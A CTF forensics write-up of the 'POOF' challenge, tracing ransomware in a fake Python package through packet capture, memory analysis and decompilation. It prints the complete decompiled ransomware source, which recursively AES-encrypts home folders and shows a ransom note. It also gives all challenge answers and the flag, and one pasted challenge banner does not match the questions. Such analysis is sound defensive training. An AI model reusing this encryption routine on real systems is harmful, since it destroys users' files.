# POOF

## Background

> In my company, we are developing a new python game for Halloween. I'm the leader of this project; thus, I want it to be unique. So I researched the most cutting-edge python libraries for game development until I stumbled upon a private game-dev discord server. One member suggested I try a new python library that provides enhanced game development capabilities. I was excited about it until I tried it. Quite simply, all my files are encrypted now. Thankfully I manage to capture the memory and the network traffic of my Linux server during the incident. Can you analyze it and help me recover my files? To get the flag, connect to the docker service and answer the questions.
> WARNING! Do not try to run the malware on your host. It may harm your computer!  

> Difficulty: Easy

- Overall difficulty for me: Hard

**In this challenge, we can spawn a docker instance and download a file!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBoo/Forensics/POOF/images/a1.png)

```
┌──(root🌸siunam)-[~/ctf/HackTheBoo/Forensics/POOF]
└─# unzip forensics_poof.zip 
Archive:  forensics_poof.zip
  inflating: candy_dungeon.pdf.boo   
  inflating: mem.dmp                 
  inflating: poof_capture.pcap       
  inflating: Ubuntu_4.15.0-184-generic_profile.zip 

┌──(root🌸siunam)-[~/ctf/HackTheBoo/Forensics/POOF]
└─# file *              
candy_dungeon.pdf.boo:                 data
forensics_poof.zip:                    Zip archive data, at least v2.0 to extract, compression method=deflate
mem.dmp:                               ELF 64-bit LSB core file, x86-64, version 1 (SYSV)
poof_capture.pcap:                     pcap capture file, microsecond ts (little-endian) - version 2.4 (Ethernet, capture length 262144)
Ubuntu_4.15.0-184-generic_profile.zip: Zip archive data, at least v2.0 to extract, compression method=deflate
```

## Find the flag

### Question 1

**We can `nc` in to the docker IP!**
```
┌──(root🌸siunam)-[~/ctf/HackTheBoo/Forensics/POOF]
└─# nc 167.71.137.174 32661

+-----------+---------------------------------------------------------+
|   Title   |                       Description                       |
+-----------+---------------------------------------------------------+
| Downgrade |          During recent auditing, we noticed that        |
|           |     network authentication is not forced upon remote    |
|           |       connections to our Windows 2012 server. That      |
|           |           led us to investigate our system for          |
|           |  suspicious logins further. Provided the server's event |
|           |       logs, can you find any suspicious successful      |
|           |                          login?                         |
+-----------+---------------------------------------------------------+

Which is the malicious URL that the ransomware was downloaded from? (for example: http://maliciousdomain/example/file.extension)
> 
```

**Looks like we need to do some malware analysis!**

**In `poof_capture.pcap`, we can open it via WireShark:**
```
┌──(root🌸siunam)-[~/ctf/HackTheBoo/Forensics/POOF]
└─# wireshark poof_capture.pcap
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBoo/Forensics/POOF/images/a2.png)

**Let's filter all HTTP requests!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBoo/Forensics/POOF/images/a3.png)

The first GET request looks sussy!

**Let's follow HTTP stream!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBoo/Forensics/POOF/images/a4.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBoo/Forensics/POOF/images/a5.png)

Found it!

- Question 1 answer: `http://files.pypi-install.com/packages/a5/61/caf3af6d893b5cb8eae9a90a3054f370a92130863450e3299d742c7a65329d94/pygaming-dev-13.37.tar.gz`

```
Which is the malicious URL that the ransomware was downloaded from? (for example: http://maliciousdomain/example/file.extension)
> http://files.pypi-install.com/packages/a5/61/caf3af6d893b5cb8eae9a90a3054f370a92130863450e3299d742c7a65329d94/pygaming-dev-13.37.tar.gz
[+] Correct!
```

### Question 2

```
What is the name of the malicious process? (for example: malicious)
>
```

**Next, we can use `volatility` to investigate the memory!** (Note: I'm using Volatility python 2 version.)

**Create custom profile:**
```
┌──(root🌸siunam)-[~/ctf/HackTheBoo/Forensics/POOF]
└─# cp Ubuntu_4.15.0-184-generic_profile.zip /opt/volatility/volatility/plugins/overlays/linux/
```

**Verify the profile is created:**
```
┌──(root🌸siunam)-[~/ctf/HackTheBoo/Forensics/POOF]
└─# python2 /opt/volatility/vol.py --info | grep Ubuntu
Volatility Foundation Volatility Framework 2.6.1
LinuxUbuntu_4_15_0-184-generic_profilex64 - A Profile for Linux Ubuntu_4.15.0-184-generic_profile x64
```

**Check the banner:**
```
┌──(root🌸siunam)-[~/ctf/HackTheBoo/Forensics/POOF]
└─# python2 /opt/volatility/vol.py -f mem.dmp linux_banner --profile=LinuxUbuntu_4_15_0-184-generic_profilex64
Volatility Foundation Volatility Framework 2.6.1
Linux version 4.15.0-184-generic (buildd@lcy02-amd64-006) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #194-Ubuntu SMP Thu Jun 2 18:54:48 UTC 2022 (Ubuntu 4.15.0-184.194-generic 4.15.18)
```

**Dump all the processes:**
```
┌──(root🌸siunam)-[~/ctf/HackTheBoo/Forensics/POOF]
└─# python2 /opt/volatility/vol.py -f mem.dmp linux_psaux --profile=LinuxUbuntu_4_15_0-184-generic_profilex64 
Volatility Foundation Volatility Framework 2.6.1
Pid    Uid    Gid    Arguments                                                       
[...]
1312   1000   1000   -bash                                                           
1340   1000   1000   ./configure                                                     
1341   1000   1000   ./configure       
```

The `./configure` looks sussy!

- Question 2 answer: `configure`

```
What is the name of the malicious process? (for example: malicious)

> configure
[+] Correct!
```

### Question 3

```
Provide the md5sum of the ransomware file.
> 
```

**Lists files referenced by the filesystem cache:**
```
┌──(root🌸siunam)-[~/ctf/HackTheBoo/Forensics/POOF]
└─# python2 /opt/volatility/vol.py -f mem.dmp linux_enumerate_files --profile=LinuxUbuntu_4_15_0-184-generic_profilex64
[...]
0xffff9d00bc4d8dc0                    268276 /home/developer/Documents
0xffff9d00bc4dcdf8                    268279 /home/developer/Documents/halloween_python_game
0xffff9d00bc4dbcd8                    268280 /home/developer/Documents/halloween_python_game/candy_dungeon.pdf.boo
0xffff9d00bc4df038                    268290 /home/developer/Documents/halloween_python_game/pygaming-dev-13.37.tar.gz.boo
0xffff9d00bc4debf0                    268285 /home/developer/Documents/halloween_python_game/game.py.boo
0xffff9d00bc4da770                    268291 /home/developer/Documents/halloween_python_game/pygaming-dev-13.37
               0x0 ------------------------- /home/developer/Documents/halloween_python_game/pygaming-dev-13.37/configure?6222983
0xffff9d00bc4de7a8                    268292 /home/developer/Documents/halloween_python_game/pygaming-dev-13.37/configure
[...]
```

The `configure` malware is in `/home/developer/Documents/halloween_python_game/pygaming-dev-13.37/configure`.

**Recovers the entire cached file system from memory:**
```
┌──(root🌸siunam)-[~/ctf/HackTheBoo/Forensics/POOF]
└─# python2 /opt/volatility/vol.py -f mem.dmp linux_recover_filesystem --dump-dir=dump/ --profile=LinuxUbuntu_4_15_0-184-generic_profilex64                  
```

```
┌──(root🌸siunam)-[~/…/developer/Documents/halloween_python_game/pygaming-dev-13.37]
└─# md5sum configure 
c6bc2b3d16cbbc7e9d7304e71ae6f0e6  configure
```

**But it's wrong...**
```
> c6bc2b3d16cbbc7e9d7304e71ae6f0e6
[-] Wrong Answer.
```

**The reason why it's wrong is because we're looking at the wrong file.**

Let's take a step back.

**We can use `linux_elfs` to find ELF binaries in process mappings:**
```
┌──(root🌸siunam)-[~/ctf/HackTheBoo/Forensics/POOF]
└─# python2 /opt/volatility/vol.py -f mem.dmp linux_elfs --profile=LinuxUbuntu_4_15_0-184-generic_profilex64
Volatility Foundation Volatility Framework 2.6.1
Pid      Name              Start              End                Elf Path                                                     Needed
-------- ----------------- ------------------ ------------------ ------------------------------------------------------------ ------
[...]
1340 configure         0x0000000000400000 0x0000000000424688 /home/developer/Documents/hal...pygaming-dev-13.37/configure libdl.so.2,libz.so.1,libpthread.so.0,libc.so.6
1340 configure         0x00007f33e8093000 0x00007f33e8483ae0 libc.so.6                                                    ld-linux-x86-64.so.2
1340 configure         0x00007f33e8484000 0x00007f33e86a2480 libpthread.so.0                                              libc.so.6,ld-linux-x86-64.so.2
1340 configure         0x00007f33e86a3000 0x00007f33e88bf0b0 libz.so.1                                                    libc.so.6
1340 configure         0x00007f33e88c0000 0x00007f33e8ac3110 libdl.so.2                                                   libc.so.6,ld-linux-x86-64.so.2
1341 configure         0x0000000000400000 0x0000000000424688 /home/developer/Documents/hal...pygaming-dev-13.37/configure libdl.so.2,libz.so.1,libpthread.so.0,libc.so.6
1341 configure         0x00007f6c4b205000 0x00007f6c4b416738 libnss_files.so.2                                            libc.so.6
1341 configure         0x00007f6c4b417000 0x00007f6c4b630a58 libnsl.so.1                                                  libc.so.6
1341 configure         0x00007f6c4b631000 0x00007f6c4b83c588 libnss_nis.so.2                                              libnsl.so.1,libnss_files.so.2,libc.so.6
1341 configure         0x00007f6c4b83d000 0x00007f6c4ba468c0 libnss_compat.so.2                                           libc.so.6
1341 configure         0x00007f6c4ba47000 0x00007f6c4bc4a050 /tmp/_MEIiYpNyP/Crypto/Cipher/_raw_aesni.abi3.so             libpthread.so.0,libc.so.6
1341 configure         0x00007f6c4bc4b000 0x00007f6c4be51038 /tmp/_MEIiYpNyP/Crypto/Cipher/_raw_aes.abi3.so               libpthread.so.0,libc.so.6
1341 configure         0x00007f6c4be52000 0x00007f6c4c054048 /tmp/_MEIiYpNyP/Crypto/Cipher/_raw_ocb.abi3.so               libpthread.so.0,libc.so.6
1341 configure         0x00007f6c4c055000 0x00007f6c4c256038 /tmp/_MEIiYpNyP/Crypto/Hash/_ghash_clmul.abi3.so             libpthread.so.0,libc.so.6
1341 configure         0x00007f6c4c257000 0x00007f6c4c458038 /tmp/_MEIiYpNyP/Crypto/Hash/_ghash_portable.abi3.so          libpthread.so.0,libc.so.6
1341 configure         0x00007f6c4c459000 0x00007f6c4c65a028 /tmp/_MEIiYpNyP/Crypto/Util/_cpuid_c.abi3.so
[...]
```

```
┌──(root🌸siunam)-[~/…/POOF/dump/tmp/_MEIiYpNyP]
└─# ls -lah       
total 9.6M
drwx------  4 nam  nam  4.0K Oct 26 01:29 .
drwxrwxrwx 10 root root 4.0K Oct 26 02:10 ..
-rwx------  1 nam  nam  769K Oct 20 05:10 base_library.zip
drwx------  8 nam  nam  4.0K Oct 26 01:29 Crypto
-rwx------  1 nam  nam   66K Oct 20 05:10 libbz2.so.1.0
-rwx------  1 nam  nam  2.8M Oct 20 05:10 libcrypto.so.1.1
drwx------  2 nam  nam  4.0K Oct 26 01:29 lib-dynload
-rwx------  1 nam  nam  199K Oct 20 05:10 libexpat.so.1
-rwx------  1 nam  nam   31K Oct 20 05:10 libffi.so.6
-rwx------  1 nam  nam  151K Oct 20 05:10 liblzma.so.5
-rwx------  1 nam  nam  4.5M Oct 20 05:10 libpython3.6m.so.1.0
-rwx------  1 nam  nam  288K Oct 20 05:10 libreadline.so.7
-rwx------  1 nam  nam  564K Oct 20 05:10 libssl.so.1.1
-rwx------  1 nam  nam  167K Oct 20 05:10 libtinfo.so.5
-rwx------  1 nam  nam  115K Oct 20 05:10 libz.so.1
```

**Hmm... This looks like the shared libraries to encrypt all the files.**

But none of them all correct...

**Let's take a step back, and reviewing what we have:**
```
┌──(root🌸siunam)-[~/ctf/HackTheBoo/Forensics/POOF]
└─# ls -lah 
[...]
-rw-r--r-- 1 root root 2.5M Oct 26 05:38 candy_dungeon.pdf.boo
-rw-r--r-- 1 nam  nam  205M Oct 26 07:43 forensics_poof.zip
-rw-r--r-- 1 root root 1.1G Oct 26 05:21 mem.dmp
-rw-r--r-- 1 root root 7.5M Oct 26 05:23 poof_capture.pcap
-rw-r--r-- 1 root root 1.1M Oct 26 05:48 Ubuntu_4.15.0-184-generic_profile.zip
```

**We should really take a look at the `pcap` file again:**
```
┌──(root🌸siunam)-[~/ctf/HackTheBoo/Forensics/POOF]
└─# wireshark poof_capture.pcap
```

**In WireShark, I remember we can export objects:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBoo/Forensics/POOF/images/a6.png)

**Hmm... How about we export the HTTP object?**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBoo/Forensics/POOF/images/a7.png)

**Oh! We found the original ransomeware!**
```
┌──(root🌸siunam)-[~/ctf/HackTheBoo/Forensics/POOF]
└─# file pygaming-dev-13.37.tar.gz 
pygaming-dev-13.37.tar.gz: gzip compressed data, last modified: Wed Oct 26 09:13:31 2022, from Unix, original size modulo 2^32 7505920
```

**Let's use `tar` to extract that!**
```
┌──(root🌸siunam)-[~/ctf/HackTheBoo/Forensics/POOF]
└─# tar -xf pygaming-dev-13.37.tar.gz

┌──(root🌸siunam)-[~/ctf/HackTheBoo/Forensics/POOF]
└─# ls -alh pygaming-dev-13.37
total 7.2M
drwxr-xr-x 2 root root 4.0K Oct 26 05:13 .
drwxr-xr-x 3 root root 4.0K Oct 27 04:35 ..
-rwxr-xr-x 1 root root 7.2M Oct 26 05:12 configure
```

**`md5sum`:**
```
┌──(root🌸siunam)-[~/ctf/HackTheBoo/Forensics/POOF]
└─# md5sum pygaming-dev-13.37/configure
c010fb1fdf8315bc442c334886804e00  pygaming-dev-13.37/configure
```

- Answer: `c010fb1fdf8315bc442c334886804e00`

```
Provide the md5sum of the ransomware file.

> c010fb1fdf8315bc442c334886804e00
[+] Correct!
```

### Question 4

```
Which programming language was used to develop the ransomware? (for example: nim)
> 
```

**Let's reverse engineer that ransomware via `strings`!**
```
┌──(root🌸siunam)-[~/…/HackTheBoo/Forensics/POOF/pygaming-dev-13.37]
└─# strings configure
[...]
%s%c%s.py
[...]
```

- Answer: `python`

```
Which programming language was used to develop the ransomware? (for example: nim)
> python
[+] Correct!
```

### Question 5

```
After decompiling the ransomware, what is the name of the function used for encryption? (for example: encryption)
> 
```

**Hmm... This is a compiled python executable, but it's an ELF executable??**

**After I fumbling around, I found that we can decompile python ELF exectuable, to `pyc`, to `py`!**

**According to [HackTricks](https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/.pyc#from-compiled-binary-to-.pyc), we can decompile ELF executable to pyc:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBoo/Forensics/POOF/images/a8.png)

- [pyinstxtractor](https://github.com/extremecoders-re/pyinstxtractor) GitHub repository

```
┌──(root🌸siunam)-[~/…/HackTheBoo/Forensics/POOF/pygaming-dev-13.37]
└─# python /opt/pyinstxtractor/pyinstxtractor.py configure 
[+] Processing configure
[+] Pyinstaller version: 2.1+
[+] Python version: 3.6
[+] Length of package: 7448630 bytes
[+] Found 79 files in CArchive
[+] Beginning extraction...please standby
[+] Possible entry point: pyiboot01_bootstrap.pyc
[+] Possible entry point: pyi_rth_subprocess.pyc
[+] Possible entry point: pyi_rth_pkgutil.pyc
[+] Possible entry point: pyi_rth_inspect.pyc
[+] Possible entry point: configure.pyc
[!] Warning: This script is running in a different Python version than the one used to build the executable.
[!] Please run this script in Python 3.6 to prevent extraction errors during unmarshalling
[!] Skipping pyz extraction
[+] Successfully extracted pyinstaller archive: configure

You can now use a python decompiler on the pyc files within the extracted directory
                                                                                                       
┌──(root🌸siunam)-[~/…/HackTheBoo/Forensics/POOF/pygaming-dev-13.37]
└─# ls -lah configure_extracted 
total 11M
drwxr-xr-x 5 root root 4.0K Oct 27 04:58 .
drwxr-xr-x 3 root root 4.0K Oct 27 04:58 ..
-rw-r--r-- 1 root root 769K Oct 27 04:58 base_library.zip
-rw-r--r-- 1 root root 3.0K Oct 27 04:58 configure.pyc
drwxr-xr-x 8 root root 4.0K Oct 27 04:58 Crypto
-rw-r--r-- 1 root root  66K Oct 27 04:58 libbz2.so.1.0
-rw-r--r-- 1 root root 2.8M Oct 27 04:58 libcrypto.so.1.1
drwxr-xr-x 2 root root 4.0K Oct 27 04:58 lib-dynload
-rw-r--r-- 1 root root 199K Oct 27 04:58 libexpat.so.1
-rw-r--r-- 1 root root  31K Oct 27 04:58 libffi.so.6
-rw-r--r-- 1 root root 151K Oct 27 04:58 liblzma.so.5
-rw-r--r-- 1 root root 4.5M Oct 27 04:58 libpython3.6m.so.1.0
-rw-r--r-- 1 root root 288K Oct 27 04:58 libreadline.so.7
-rw-r--r-- 1 root root 564K Oct 27 04:58 libssl.so.1.1
-rw-r--r-- 1 root root 167K Oct 27 04:58 libtinfo.so.5
-rw-r--r-- 1 root root 115K Oct 27 04:58 libz.so.1
-rw-r--r-- 1 root root 1.4K Oct 27 04:58 pyiboot01_bootstrap.pyc
-rw-r--r-- 1 root root 1.7K Oct 27 04:58 pyimod01_os_path.pyc
-rw-r--r-- 1 root root 8.6K Oct 27 04:58 pyimod02_archive.pyc
-rw-r--r-- 1 root root  18K Oct 27 04:58 pyimod03_importers.pyc
-rw-r--r-- 1 root root 3.6K Oct 27 04:58 pyimod04_ctypes.pyc
-rw-r--r-- 1 root root  672 Oct 27 04:58 pyi_rth_inspect.pyc
-rw-r--r-- 1 root root 1.1K Oct 27 04:58 pyi_rth_pkgutil.pyc
-rw-r--r-- 1 root root  809 Oct 27 04:58 pyi_rth_subprocess.pyc
-rw-r--r-- 1 root root 1.3M Oct 27 04:58 PYZ-00.pyz
drwxr-xr-x 2 root root 4.0K Oct 27 04:58 PYZ-00.pyz_extracted
-rw-r--r-- 1 root root  293 Oct 27 04:58 struct.pyc
```

**Then, we can decompile the `pyc` to `py`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBoo/Forensics/POOF/images/a9.png)

**Since my `uncompyle6` is kinda broken, I'll use an [online tool](https://www.toolnb.com/tools-lang-en/pyc.html) to decompile it:**
```
┌──(root🌸siunam)-[~/…/HackTheBoo/Forensics/POOF/pygaming-dev-13.37]
└─# uncompyle6 -h
I don't know about Python version '3.10.7' yet.
Python versions 3.9 and greater are not supported.
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBoo/Forensics/POOF/images/a10.png)

```py
from Crypto.Cipher import AES
from sys import exit
import random, string, time, os

def Pkrr1fe0qmDD9nKx(filename: str, data: bytes) -> None:
    open(filename, 'wb').write(data)
    os.rename(filename, f"{filename}.boo")


def mv18jiVh6TJI9lzY(filename: str) -> None:
    data = open(filename, 'rb').read()
    key = 'vN0nb7ZshjAWiCzv'
    iv = 'ffTC776Wt59Qawe1'
    cipher = AES.new(key.encode('utf-8'), AES.MODE_CFB, iv)
    ct = cipher.encrypt(data)
    Pkrr1fe0qmDD9nKx(filename, ct)


def w7oVNKAyN8dlWJk() -> str:
    letters = string.ascii_lowercase + string.digits
    _id = ''.join(random.choice(letters) for i in range(32))
    return _id


def print_note() -> None:
    _id = w7oVNKAyN8dlWJk()
    banner = f"\n\nPippity poppity give me your property!\n\n\t   *                  ((((\n*            *        *  (((\n\t   *                (((      *\n  *   / \\        *     *(((    \n   __/___\\__  *          (((\n\t (O)  |         *     ((((\n*  '<   ? |__ ... .. .             *\n\t \\@      \\    *    ... . . . *\n\t //__     \t// ||\\__   \\    |~~~~~~ . . .   *\n====M===M===| |=====|~~~~~~   . . .. .. .\n\t\t *  \\ \\ \\   |~~~~~~    *\n  *         <__|_|   ~~~~~~ .   .     ... .\n\t\nPOOF!\n\nDon't you speak English? Use https://translate.google.com/?sl=en&tl=es&op=translate \n\nYOU GOT TRICKED! Your home folder has been encrypted due to blind trust.\nTo decrypt your files, you need the private key that only we possess. \n\nYour ID: {_id}\n\nDon't waste our time and pay the ransom; otherwise, you will lose your precious files forever.\n\nWe accept crypto or candy.\n\nDon't hesitate to get in touch with cutie_pumpkin@ransomwaregroup.com during business hours.\n\n\t"
    print(banner)
    time.sleep(60)


def yGN9pu2XkPTWyeBK(directory: str) -> list:
    filenames = []
    for filename in os.listdir(directory):
        result = os.path.join(directory, filename)
        if os.path.isfile(result):
            filenames.append(result)
        else:
            filenames.extend(yGN9pu2XkPTWyeBK(result))

    return filenames


def main() -> None:
    username = os.getlogin()
    if username != 'developer13371337':
        exit(1)
    directories = [f"/home/{username}/Downloads",
     f"/home/{username}/Documents",
     f"/home/{username}/Desktop"]
    for directory in directories:
        if os.path.exists(directory):
            files = yGN9pu2XkPTWyeBK(directory)
            for fil in files:
                try:
                    mv18jiVh6TJI9lzY(fil)
                except Exception as e:
                    pass

    print_note()


if __name__ == '__main__':
    main()
```

**In the function `mv18jiVh6TJI9lzY`, it's using AES to encrypt data:**
```py
def mv18jiVh6TJI9lzY(filename: str) -> None:
    data = open(filename, 'rb').read()
    key = 'vN0nb7ZshjAWiCzv'
    iv = 'ffTC776Wt59Qawe1'
    cipher = AES.new(key.encode('utf-8'), AES.MODE_CFB, iv)
    ct = cipher.encrypt(data)
    Pkrr1fe0qmDD9nKx(filename, ct)
```

- Answer: `mv18jiVh6TJI9lzY`

```
After decompiling the ransomware, what is the name of the function used for encryption? (for example: encryption)

> mv18jiVh6TJI9lzY
[+] Correct!
```

### Question 6

```
Decrypt the given file, and provide its md5sum.
> 
```

**Now, we have to decrypt the given file, which is the `candy_dungeon.pdf.boo`.**

**To do so, I'll:**

- Find the encryption key:

**In the function `print_note`, it tells us how to decrypt the file:**
```py
def print_note() -> None:
    _id = w7oVNKAyN8dlWJk()
    banner = f"\n\nPippity poppity give me your property!\n\n\t   *                  ((((\n*            *        *  (((\n\t   *                (((      *\n  *   / \\        *     *(((    \n   __/___\\__  *          (((\n\t (O)  |         *     ((((\n*  '<   ? |__ ... .. .             *\n\t \\@      \\    *    ... . . . *\n\t //__     \t// ||\\__   \\    |~~~~~~ . . .   *\n====M===M===| |=====|~~~~~~   . . .. .. .\n\t\t *  \\ \\ \\   |~~~~~~    *\n  *         <__|_|   ~~~~~~ .   .     ... .\n\t\nPOOF!\n\nDon't you speak English? Use https://translate.google.com/?sl=en&tl=es&op=translate \n\nYOU GOT TRICKED! Your home folder has been encrypted due to blind trust.\nTo decrypt your files, you need the private key that only we possess. \n\nYour ID: {_id}\n\nDon't waste our time and pay the ransom; otherwise, you will lose your precious files forever.\n\nWe accept crypto or candy.\n\nDon't hesitate to get in touch with cutie_pumpkin@ransomwaregroup.com during business hours.\n\n\t"
    print(banner)
    time.sleep(60)
```

```
To decrypt your files, you need the private key that only we possess.
```

**The encryption keys are hardcoded in function `mv18jiVh6TJI9lzY`:**
```py
key = 'vN0nb7ZshjAWiCzv'
iv = 'ffTC776Wt59Qawe1'
```

- Backup the encrypted file:

```
┌──(root🌸siunam)-[~/ctf/HackTheBoo/Forensics/POOF]
└─# cp candy_dungeon.pdf.boo candy_dungeon.pdf.boo.bak
```

- Write a decryption script: (Source: [PyCryptodome](https://pycryptodome.readthedocs.io/en/latest/src/cipher/classic.html#cfb-mode) and [StackOverflow](https://stackoverflow.com/questions/50302827/object-type-class-str-cannot-be-passed-to-c-code-virtual-environment))

```py
#!/usr/bin/env python3

from Crypto.Cipher import AES

def decryption():
  key = 'vN0nb7ZshjAWiCzv'
  iv = 'ffTC776Wt59Qawe1'
  file = './candy_dungeon.pdf.boo'

  ct = open(file, 'rb').read()
  cipher = AES.new(key.encode('utf-8'), AES.MODE_CFB, iv=iv.encode('utf-8'))
  pt = cipher.decrypt(ct)
  open('decrypted.pdf', 'wb').write(pt)

if __name__ == '__main__':
  decryption()
```

**Output:**
```
┌──(root🌸siunam)-[~/ctf/HackTheBoo/Forensics/POOF]
└─# python3 decrypt_file.py

┌──(root🌸siunam)-[~/ctf/HackTheBoo/Forensics/POOF]
└─# file decrypted.pdf 
decrypted.pdf: PDF document, version 1.4
```

**Let's open this PDF!**
```
┌──(root🌸siunam)-[~/ctf/HackTheBoo/Forensics/POOF]
└─# evince decrypted.pdf
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBoo/Forensics/POOF/images/a11.png)

**We successfully decrypted the file!**

**Let's `md5sum` this file and submit it!**
```
┌──(root🌸siunam)-[~/ctf/HackTheBoo/Forensics/POOF]
└─# md5sum decrypted.pdf
3bc9f072f5a7ed4620f57e6aa8d7e1a1  decrypted.pdf
```

- Answer: `3bc9f072f5a7ed4620f57e6aa8d7e1a1`

```
Decrypt the given file, and provide its md5sum.

> 3bc9f072f5a7ed4620f57e6aa8d7e1a1
[+] Correct!

[+] Here is the flag: HTB{n3v3r_tru5t_4ny0n3_3sp3c14lly_dur1ng_h4ll0w33n}
```

Finally got the flag!

# Conclusion

What we've learned:

1. Memory Forensics via Volatility